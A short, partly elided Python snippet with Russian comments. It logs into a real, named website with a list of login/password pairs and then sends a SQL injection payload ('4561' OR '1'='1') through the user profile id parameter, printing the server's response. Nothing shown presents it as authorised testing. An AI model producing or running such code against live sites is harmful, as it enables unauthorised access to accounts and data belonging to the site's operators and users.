...
for login, password in data[0]:
    ...
    with requests.Session() as session:
        ...
        if login_response.ok:
            ...
            # Вместо числового user_id подставляем инъекцию
            test_user_id = "4561' OR '1'='1"

            # Отправляем запрос с потенциальной инъекцией
            profile_response = session.get(f"https://dot.omgups.ru/user/profile.php?id={test_user_id}")
            print(profile_response.text)  # Посмотрите, как сервер реагирует на инъекцию
